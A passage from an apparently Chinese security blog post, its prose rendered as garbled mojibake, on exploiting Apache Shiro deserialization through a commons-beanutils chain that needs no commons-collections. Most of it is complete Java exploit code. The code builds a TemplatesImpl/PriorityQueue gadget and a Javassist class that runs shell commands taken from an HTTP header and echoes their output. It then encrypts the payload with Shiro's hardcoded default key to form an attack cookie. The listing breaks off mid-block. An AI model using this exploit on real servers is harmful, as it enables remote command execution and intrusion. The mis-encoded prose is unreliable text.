è¿™ä¸ªç±»ã€‚æˆ‘ä»¬æ˜æ˜ç”¨çš„æ˜¯<code>CB</code>çš„é“¾å­ï¼Œä¸ºä»€ä¹ˆä¼šæ‰¯åˆ°<code>CC</code>ï¼Ÿ</p><p>commons-beanutilsæœ¬æ¥ä¾èµ–äºcommons-collectionsï¼Œä½†æ˜¯åœ¨Shiroä¸­ï¼Œå®ƒçš„commons-beanutilsè™½ç„¶åŒ…å«äº†ä¸€éƒ¨åˆ†commons-collectionsçš„ç±»ï¼Œä½†å´ä¸å…¨ã€‚è¿™ä¹Ÿå¯¼è‡´ï¼Œæ­£å¸¸ä½¿ç”¨Shiroçš„æ—¶å€™ä¸éœ€è¦ä¾èµ–äºcommons-collectionsï¼Œä½†ååºåˆ—åŒ–åˆ©ç”¨çš„æ—¶å€™éœ€è¦ä¾èµ–äºcommons-collectionsã€‚</p><p>éš¾é“æ²¡æœ‰commons-collectionså°±æ— æ³•è¿›è¡Œååºåˆ—åŒ–åˆ©ç”¨å—ï¼Ÿå½“ç„¶æœ‰ã€‚</p><h4 id="æ— ä¾èµ–çš„Shiroååºåˆ—åŒ–åˆ©ç”¨é“¾"><a href="#æ— ä¾èµ–çš„Shiroååºåˆ—åŒ–åˆ©ç”¨é“¾" class="headerlink" title="æ— ä¾èµ–çš„Shiroååºåˆ—åŒ–åˆ©ç”¨é“¾"></a>æ— ä¾èµ–çš„Shiroååºåˆ—åŒ–åˆ©ç”¨é“¾</h4><p>å…ˆæ¥çœ‹çœ‹<code>org.apache.commons.collections.comparators.ComparableComparator</code>è¿™ä¸ªç±»åœ¨å“ªé‡Œä½¿ç”¨äº†ï¼Œè¿›<code>BeanComparator()</code>:</p><p><img src="/img/poplaroa_13.png" alt="poplaroa_13"></p><p>åœ¨<code>BeanComparator</code>ç±»çš„æ„é€ å‡½æ•°å¤„ï¼Œå½“æ²¡æœ‰æ˜¾å¼ä¼ å…¥<code>Comparator</code>çš„æƒ…å†µä¸‹ï¼Œåˆ™é»˜è®¤ä½¿ç”¨<code>ComparableComparator</code>ã€‚</p><p>æ‰€ä»¥CBé“¾ä¸€å®šè¦ä¾èµ–CCå­˜åœ¨å—ï¼Ÿå½“ç„¶ä¸æ˜¯ï¼š</p><blockquote><p>æ—¢ç„¶æ­¤æ—¶æ²¡æœ‰<code>ComparableComparator</code>ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä¸€ä¸ªç±»æ¥æ›¿æ¢ï¼Œå®ƒæ»¡è¶³ä¸‹é¢è¿™å‡ ä¸ªæ¡ä»¶ï¼š</p><ul><li>å®ç°<code>java.util.Comparator</code>æ¥å£</li><li>å®ç°<code>java.io.Serializable</code>æ¥å£</li><li>Javaã€shiroæˆ–commons-beanutilsè‡ªå¸¦ï¼Œä¸”å…¼å®¹æ€§å¼º</li></ul></blockquote><p>è¿™é‡Œç›´æ¥ç»™å‡ºç»“æœï¼Œå¯ä»¥ç”¨<code>AttrCompare</code>:</p><p><img src="/img/polaroa_16.png" alt="polaroa_16"></p><p>POC:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs JAVA"><span class="hljs-comment">//éœ€è¦æ³¨æ„çš„æ˜¯è¿™æ®µPOCæˆ‘ä»¬è¿˜æ˜¯éœ€è¦å¯¼å…¥CCçš„ç›¸å…³ä¾èµ–ï¼Œä½†è¿™å¹¶ä¸ä¸â€œæ— CCä¾èµ–â€ç›¸æ‚–ã€‚æˆ‘ä»¬å…ˆæŠŠcomparatorå­—æ®µçš„å€¼è®¾ç½®ä¸ºCCä¸­çš„TransformingComparatorï¼Œä¸»è¦ç›®çš„æ˜¯åœ¨addæ—¶è®©ä»–ä¸è§¦å‘compareæ–¹æ³•ã€‚addåç»™æ”¹å›æˆ‘ä»¬é¢„æœŸçš„BeanComparatorå³å¯</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ShiroCB</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates, <span class="hljs-string">&quot;aaa&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodeField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodeField.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryField.set(templates,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D://Tomcat/CC/target/classes/EXP/Demo.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodeField.set(templates, codes);<br><br><br><span class="hljs-comment">//PropertyUtils Properties = (PropertyUtils) PropertyUtils.getProperty(templates, &quot;getOutputProperties&quot;);</span><br><br>        <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">beanComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>(<span class="hljs-string">&quot;outputProperties&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">AttrCompare</span>());<br><span class="hljs-comment">//CCé‡Œé¢æœ‰ï¼Œä¸ºäº†ä¸æŠ¥é”™ï¼Œä¼ å…¥ä¸€ä¸ªï¼Œåå°„çš„æ—¶å€™å†ä¿®æ”¹å›æ¥</span><br>        <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>&lt;&gt;(<span class="hljs-number">1</span>));<br><br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);<br><br>        priorityQueue.add(templates);<br>        priorityQueue.add(<span class="hljs-number">2</span>);<br><span class="hljs-comment">//æ”¹å›æ¥ï¼š</span><br>        Class&lt;PriorityQueue&gt; c = PriorityQueue.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">comparetorFied</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;comparator&quot;</span>);<br>        comparetorFied.setAccessible(<span class="hljs-literal">true</span>);<br>        comparetorFied.set(priorityQueue,beanComparator);<br><br>        serialize(priorityQueue);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException,ClassNotFoundException&#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="ç¬¬äºŒä¸ªé—®é¢˜ï¼šå¦‚ä½•ç¼©çŸ­æˆ‘ä»¬çš„payload"><a href="#ç¬¬äºŒä¸ªé—®é¢˜ï¼šå¦‚ä½•ç¼©çŸ­æˆ‘ä»¬çš„payload" class="headerlink" title="ç¬¬äºŒä¸ªé—®é¢˜ï¼šå¦‚ä½•ç¼©çŸ­æˆ‘ä»¬çš„payload?"></a>ç¬¬äºŒä¸ªé—®é¢˜ï¼šå¦‚ä½•ç¼©çŸ­æˆ‘ä»¬çš„payload?</h4><p><a href="https://developer.aliyun.com/article/863792#slide-4">å‚è€ƒæ–‡ç« </a></p><p>å…¶å®å°±æ˜¯åˆ©ç”¨<code>Javassist</code>å°†å†™æ­»çš„æ¶æ„ç±»é€šè¿‡åŠ¨æ€æ„é€ å®ç°ç¼©çŸ­ï¼Œæ¯”å¦‚å¯¹äºä¹‹å‰æˆ‘ä»¬å¼¹è®¡ç®—å™¨çš„æ¶æ„ç±»<code>Clac.java</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Clac</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException var1) &#123;<br>            var1.printStackTrace();<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬ä¸å…‰éœ€è¦å®ç°<code>AbstractTranslet</code>ä¸­å®šä¹‰çš„æŠ½è±¡æ–¹æ³•ï¼Œè¿˜å¾—å¼•å…¥å¤§é‡å…¶å®ƒåŒ…ä¸­çš„ç±»ã€‚è¿™æ ·ä¸€æ¥å°±å¯¼è‡´æˆ‘ä»¬çš„<code>payload</code>é•¿åº¦å¢åŠ ã€‚</p><p>é‚£æ€ä¹ˆæ„é€ å‘¢ï¼Ÿ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> CtClass <span class="hljs-title function_">genPayloadForLinux2</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> NotFoundException, CannotCompileException &#123;<br>       <span class="hljs-type">ClassPool</span> <span class="hljs-variable">classPool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>       <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> classPool.makeClass(<span class="hljs-string">&quot;A&quot;</span>);<br>       <span class="hljs-keyword">if</span> ((clazz.getDeclaredConstructors()).length != <span class="hljs-number">0</span>) &#123;<br>           clazz.removeConstructor(clazz.getDeclaredConstructors()[<span class="hljs-number">0</span>]);<br>       &#125;<br>       clazz.addConstructor(CtNewConstructor.make(<span class="hljs-string">&quot;public A() throws Exception &#123;\n&quot;</span> +<br>               <span class="hljs-string">&quot;                org.springframework.web.context.request.RequestAttributes requestAttributes = org.springframework.web.context.request.RequestContextHolder.getRequestAttributes();\n&quot;</span> +<br>               <span class="hljs-string">&quot;                javax.servlet.http.HttpServletRequest httprequest = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getRequest();\n&quot;</span> +<br>               <span class="hljs-string">&quot;                javax.servlet.http.HttpServletResponse httpresponse = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getResponse();\n&quot;</span> +<br>               <span class="hljs-string">&quot;                String[] cmd =  new String[]&#123;\&quot;sh\&quot;, \&quot;-c\&quot;, httprequest.getHeader(\&quot;C\&quot;)&#125;;\n&quot;</span> +<br>               <span class="hljs-string">&quot;                byte[] result = new java.util.Scanner(new ProcessBuilder(cmd).start().getInputStream()).useDelimiter(\&quot;\\\\A\&quot;).next().getBytes();\n&quot;</span> +<br>               <span class="hljs-string">&quot;                httpresponse.getWriter().write(new String(result));\n&quot;</span> +<br>               <span class="hljs-string">&quot;                httpresponse.getWriter().flush();\n&quot;</span> +<br>               <span class="hljs-string">&quot;                httpresponse.getWriter().close();\n&quot;</span> +<br>               <span class="hljs-string">&quot;        &#125;&quot;</span>, clazz));<br>       <span class="hljs-comment">// å…¼å®¹ä½ç‰ˆæœ¬jdk</span><br>       clazz.getClassFile().setMajorVersion(<span class="hljs-number">50</span>);<br>       <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> classPool.get(AbstractTranslet.class.getName());<br>       clazz.setSuperclass(superClass);<br>       <span class="hljs-keyword">return</span> clazz;<br>   &#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œå…¶å®å°±æ˜¯é€šè¿‡<code>Javassist</code>åº“åŠ¨æ€ç”Ÿæˆä¸€ä¸ªç±»ï¼Œå¹¶åœ¨ç±»çš„æ„é€ å‡½æ•°ä¸­æ‰§è¡Œä»HTTPè¯·æ±‚å¤´è·å–çš„å‘½ä»¤</p><p>æœ€ç»ˆ<code>POC</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><code class="hljs JAVA"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.security.c14n.helper.AttrCompare;<br><span class="hljs-keyword">import</span> javassist.*;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.comparators.TransformingComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.shiro.codec.CodecSupport;<br><span class="hljs-keyword">import</span> org.apache.shiro.crypto.AesCipherService;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FinalPoc</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-keyword">final</span> <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> getTemplate();<br><br><br><br><span class="hljs-comment">//PropertyUtils Properties = (PropertyUtils) PropertyUtils.getProperty(templates, &quot;getOutputProperties&quot;);</span><br><br>        <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">beanComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>(<span class="hljs-string">&quot;outputProperties&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">AttrCompare</span>());<br><span class="hljs-comment">//CCé‡Œé¢æœ‰ï¼Œä¸ºäº†ä¸æŠ¥é”™ï¼Œä¼ å…¥ä¸€ä¸ªï¼Œåå°„çš„æ—¶å€™å†ä¿®æ”¹å›æ¥</span><br>        <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br><br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);<br><br>        priorityQueue.add(templates);<br>        priorityQueue.add(templates);<br><span class="hljs-comment">//æ”¹å›æ¥ï¼š</span><br>        Class&lt;PriorityQueue&gt; c = PriorityQueue.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">comparetorFied</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;comparator&quot;</span>);<br>        comparetorFied.setAccessible(<span class="hljs-literal">true</span>);<br>        comparetorFied.set(priorityQueue,beanComparator);<br><br>        <span class="hljs-comment">//serialize(priorityQueue);</span><br>        <span class="hljs-comment">//unserialize(&quot;ser.bin&quot;);</span><br>        <span class="hljs-comment">// ==================</span><br>        <span class="hljs-comment">// ç”Ÿæˆåºåˆ—åŒ–å­—ç¬¦ä¸²</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(byteArrayOutputStream);<br>        objectOutputStream.writeObject(priorityQueue);<br>        <span class="hljs-type">AesCipherService</span> <span class="hljs-variable">aes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AesCipherService</span>();<br>        <span class="hljs-type">byte</span>[] key = java.util.Base64.getDecoder().decode(CodecSupport.toBytes(<span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>));<span class="hljs-comment">//shiroé»˜è®¤å¯†é’¥</span><br>        <span class="hljs-type">byte</span>[] bytes = byteArrayOutputStream.toByteArray();<br>        System.out.println(aes.encrypt(bytes, key));<br>    &#125;<br><span class="hljs-comment">/*    public static void serialize(Object obj) throws IOException &#123;</span><br><span class="hljs-comment">        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class="hljs-comment">        oos.writeObject(obj);</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    public static Object unserialize(String Filename) throws IOException,ClassNotFoundException&#123;</span><br><span class="hljs-comment">        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));</span><br><span class="hljs-comment">        Object obj = ois.readObject();</span><br><span class="hljs-comment">        return obj;</span><br><span class="hljs-comment">    &#125;*/</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> CtClass <span class="hljs-title function_">genPayloadForLinux2</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> NotFoundException, CannotCompileException &#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">classPool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> classPool.makeClass(<span class="hljs-string">&quot;A&quot;</span>);<br>        <span class="hljs-keyword">if</span> ((clazz.getDeclaredConstructors()).length != <span class="hljs-number">0</span>) &#123;<br>            clazz.removeConstructor(clazz.getDeclaredConstructors()[<span class="hljs-number">0</span>]);<br>        &#125;<br>        clazz.addConstructor(CtNewConstructor.make(<span class="hljs-string">&quot;public A() throws Exception &#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                org.springframework.web.context.request.RequestAttributes requestAttributes = org.springframework.web.context.request.RequestContextHolder.getRequestAttributes();\n&quot;</span> +<br>                <span class="hljs-string">&quot;                javax.servlet.http.HttpServletRequest httprequest = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getRequest();\n&quot;</span> +<br>                <span class="hljs-string">&quot;                javax.servlet.http.HttpServletResponse httpresponse = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getResponse();\n&quot;</span> +<br>                <span class="hljs-string">&quot;                String[] cmd =  new String[]&#123;\&quot;sh\&quot;, \&quot;-c\&quot;, httprequest.getHeader(\&quot;C\&quot;)&#125;;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                byte[] result = new java.util.Scanner(new ProcessBuilder(cmd).start().getInputStream()).useDelimiter(\&quot;\\\\A\&quot;).next().getBytes();\n&quot;</span> +<br>                <span class="hljs-string">&quot;                httpresponse.getWriter().write(new String(result));\n&quot;</span> +<br>                <span class="hljs-string">&quot;                httpresponse.getWriter().flush();\n&quot;</span> +<br>                <span class="hljs-string">&quot;                httpresponse.getWriter().close();\n&quot;</span> +<br>                <span class="hljs-string">&quot;        &#125;&quot;</span>, clazz));<br>        <span class="hljs-comment">// å…¼å®¹ä½ç‰ˆæœ¬jdk</span><br>        clazz.getClassFile().setMajorVersion(<span class="hljs-number">50</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> classPool.get(AbstractTranslet.class.getName());<br>        clazz.setSuperclass(superClass);<br>        <span class="hljs-keyword">return</span> clazz;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> TemplatesImpl <span class="hljs-title function_">getTemplate</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clz</span> <span class="hljs-operator">=</span> genPayloadForLinux2();<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(obj, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;clz.toBytecode()&#125;);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™æ ·å†™ä¹Ÿè¡Œï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span 